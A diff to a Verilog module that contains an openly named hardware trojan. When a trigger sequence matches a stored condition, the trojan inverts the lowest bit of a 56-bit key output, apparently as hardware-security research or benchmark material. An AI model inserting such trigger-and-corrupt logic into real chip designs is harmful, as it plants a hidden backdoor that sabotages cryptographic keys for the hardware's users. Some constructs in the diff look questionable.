@@ -28,6 +28,7 @@ reg [5:0]	state_order;
 reg [5:0] 	trigger_cond = {STATE0, STATE1, STATE2};
 reg 		trojan_en;
 reg			trojan_en_next;
+reg [55:0]	payload_next;
 
 //	sequential always block to set state_order and trojan_en reg, and payload output
 always @(negedge clk) begin
@@ -38,21 +39,23 @@ always @(negedge clk) begin
 	end else begin
 		state_order	<= #1 {state_order[3:0], trigger[1:2]};
 		trojan_en 	<= #1 trojan_en_next;
-
-		if (trojan_en) begin
-			payload	<= #1 {key[55:1], ~key[0]};
-		end else begin
-			payload <= #1 key;
-		end
+		payload 	<= #1 payload_next; 
 	end
 end
 
 // 	combinational always block to update trigger_en
-always @(state_order) begin
+always @(state_order, trigger_cond, trojan_en) begin
 	trojan_en_next = trojan_en;
+	payload_next = payload;
 
 	if (state_order == trigger_cond) begin
 		trojan_en_next = 1'b1;
+	end
+
+	if (trojan_en) begin
+		payload_next <= #1 {key[55:1], ~key[0]};
+	end else begin
+		payload_next <= #1 key;
 	end
 end
 
